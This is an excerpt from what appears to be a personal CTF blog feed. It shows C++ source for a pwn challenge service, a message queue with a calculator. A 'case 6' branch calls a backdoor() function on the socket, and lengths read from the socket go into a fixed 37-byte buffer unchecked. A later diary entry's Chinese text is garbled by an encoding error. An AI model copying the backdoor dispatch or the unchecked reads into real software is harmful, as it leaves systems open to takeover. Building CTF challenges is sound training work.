<span class="token keyword">int</span> length <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> packet_type <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> key_len<span class="token punctuation">,</span> id_len<span class="token punctuation">,</span> expr_len<span class="token punctuation">,</span> res_len<span class="token punctuation">,</span> status<span class="token punctuation">,</span> i<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string skey<span class="token punctuation">;</span>      string s_corr_id<span class="token punctuation">;</span>      string s_res<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> corr_id<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> res<span class="token punctuation">;</span>      Q q<span class="token punctuation">;</span>      Data d<span class="token punctuation">;</span>      <span class="token keyword">switch</span><span class="token punctuation">(</span>packet_type<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// connect</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>starting <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            starting <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// declare</span>          uuid_t uuid<span class="token punctuation">;</span>          <span class="token function">uuid_generate</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">uuid_unparse</span><span class="token punctuation">(</span>uuid<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          mq<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">(</span>skey<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> <span class="token number">36</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// retrieve</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            i <span class="token operator">=</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>corr_id <span class="token operator">!=</span> s_corr_id<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// å‡ºé˜Ÿ</span>              res_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> res_len<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// call</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          expr_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    expr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>expr<span class="token punctuation">,</span> expr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">+</span>expr_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">// æ‰§è¡Œè¿ç®—</span>          res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          status <span class="token operator">=</span> <span class="token function">calc</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          s_res <span class="token operator">=</span> res<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// å…¥é˜Ÿ</span>            d<span class="token punctuation">.</span>corr_id <span class="token operator">=</span> s_corr_id<span class="token punctuation">;</span>            d<span class="token punctuation">.</span>res <span class="token operator">=</span> s_res<span class="token punctuation">;</span>            mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// close </span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// break;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>          <span class="token function">backdoor</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// error</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  MQ mq<span class="token punctuation">;</span>  <span class="token function">handle</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> mq<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>ä»Šå¤©å°±æ°´åˆ°è¿™å„¿å§ğŸ˜­ã€‚ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="ç¯å¢ƒéƒ¨ç½²" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Some_words_of_today</title>
    <link href="http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/"/>
    <id>http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/</id>
    <published>2018-10-29T15:03:45.000Z</published>
    <updated>2019-04-02T08:46:28.150Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>ä»Šæ—¥ä»½é—²æ‰¯ã€‚ğŸ™ƒ</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ç°åœ¨æ—¶é—´å·²ç»23:06äº†ï¼Œä»Šå¤©ç»™å‡ ä½å­¦å¼Ÿç®€å•è®²äº†ä¸€äº›å°çŸ¥è¯†ï¼ˆè™½ç„¶è‡ªå·±å¾ˆlowï¼Œä½†å¸Œæœ›å­¦å¼Ÿå¯ä»¥å¾ˆå¼ºï¼‰ï¼Œå†™å®Œè¿™ç¯‡æ°´æ–‡å°±ç¡å§ã€‚ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å§‹å°±å·²ç»ä¹ æƒ¯äº†è¿™ä¹ˆæ™šç¡ï¼Œè™½ç„¶çŸ¥é“æ™šç¡å•¥çš„ï¼Œç†¬å¤œä»€ä¹ˆçš„å¯¹èº«ä½“ä¸å¥½balabalaï¼Œä½†æ˜¯ç”Ÿæ´»æ‰€è¿«ï¼Œè¢«ç”Ÿæ´»å®‰æ’çš„æ˜æ˜ç™½ç™½ï¼Œè™½ç„¶ç›®å‰å›½å†…è®¡ç®—æœºè¡Œä¸šç°çŠ¶å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>æŠ‘æˆ–æ˜¯å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; åˆšå…¥å­¦é‚£ä¼šå„¿ï¼Œå¤§å­¦å˜›ï¼Œæ†§æ†¬çš„æ˜¯å•¥ï¼Ÿæ— éå°±æ˜¯åƒå–ç©ä¹ï¼Œäº¤æœ‹å‹ï¼ˆæ‰¾å¥³ç¥¨ï¼Ÿï¼‰ä»¥åŠå°‘éƒ¨åˆ†å­¦ä¹ ã€‚å¯¹å•Šï¼Œå°±æ˜¯è¿™æ ·æ²¡é”™å•Šï¼Œå¤§å®¶éƒ½æ˜¯è¿™ä¹ˆè®¤ä¸ºçš„å˜›ï¼Œä¸€ç›´åˆ°å¤§ä¸€è¿‡å»ä¸€å¤§åŠï¼Œæˆ‘ä¹Ÿæ˜¯å­¦å­¦åœåœï¼Œç©ç©æ¸¸æˆï¼Œ<del>ä»¥åŠä¸€åœºèµ·äºé«˜ä¸­ï¼Œæ­¢äºå¤§ä¸€æœ«ï¼Œç»å†è¿‡ä¸€èµ·ï¼Œä¹Ÿç»å†è¿‡åˆ†ç¦»ï¼Œè¿˜ç»å†è¿‡å¼‚åœ°ï¼Œåƒç”µè§†å‰§ä¸€æ ·çš„æ‹çˆ±</del>,å‘¸å‘¸å‘¸ ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¾ˆæ™®éçš„ä¸€ä¸ªç°è±¡æ˜¯ï¼šå¾ˆå¤šåˆšè¸å…¥å¤§å­¦æ ¡é—¨çš„äººï¼Œå°±æƒ³å¼€å§‹æ¥ä¸€åœºè½°è½°çƒˆçƒˆçš„æ‹çˆ±ï¼Œæ¥é‡Šæ”¾è‡ªå·±çš„å¤©æ€§ï¼Œæ‹¥æŠ±å¿ƒä¸­çš„ç¾å¥½ğŸ˜„ï¼Œåˆ°åæ¥å´å¾€å¾€æ˜¯æœ€åˆå¼€å§‹çš„äººèµ°ä¸åˆ°ä¸€å—å„¿ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æˆ–è®¸å¾—åˆ°äº†ä»€ä¹ˆä¸œè¥¿ï¼Œå°±è¯¥å¤±å»ç‚¹å¦å¤–çš„ä»€ä¹ˆä¸œè¥¿ã€‚æ‰€ä»¥é‚£æ®µæ—¶é—´æˆ‘åªæ˜¯ç”Ÿæ´»åœ¨ä¸€ä¸ªå°åœˆå­é‡Œï¼Œè™½ç„¶é”™è¿‡äº†å¾ˆå¤šå¾ˆå¤šçš„ç²¾å½©ï¼Œè™šåº¦äº†äº›è®¸æ—¶æ—¥ï¼Œä½†ä¹Ÿæˆé•¿äº†è®¸å¤šã€‚ç»å†äº†ç§ç§åï¼Œæˆ‘æ‰é€æ¸æ˜ç™½æˆ‘çš„å¤§å­¦ç”Ÿæ´»ï¼Œä¹ƒè‡³äººç”Ÿæ„ä¹‰æ‰€åœ¨ğŸ˜¥ï¼Œé£èŠ±é›ªæœˆä¸è¿‡å¶å°”ï¼Œè‡ªå¼ºä¸æ¯ä¾¿æœ‰è¿œæ–¹ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€è°“å¤§å­¦è€…ï¼Œéè°“æœ‰å¤§æ¥¼ä¹‹è°“ä¹Ÿï¼Œæœ‰å¤§å¸ˆä¹‹è°“ä¹Ÿï¼Œä½†æ˜¯ç°åœ¨åˆæœ‰å‡ ä¸ªèƒ½åšåˆ°ï¼Ÿã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ä¸å…¶å¥¢æœ›å¹³å°å¦‚ä½•å¦‚ä½•å¸®è‡ªå·±ï¼Œé‚£ä¸ºä½•ä¸â€œå¤©è¡Œå¥ï¼Œå›å­ä»¥è‡ªå¼ºä¸æ¯â€å‘¢ï¼Ÿ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¤§å­¦åªæ˜¯ä¸€ä¸ªå¹³å°ï¼Œä¸€ä¸ªç»™ä½ å»ç”Ÿæ´»ï¼Œå»å±•ç¤ºï¼Œå»å®ç°ï¼Œå»åˆ›é€ 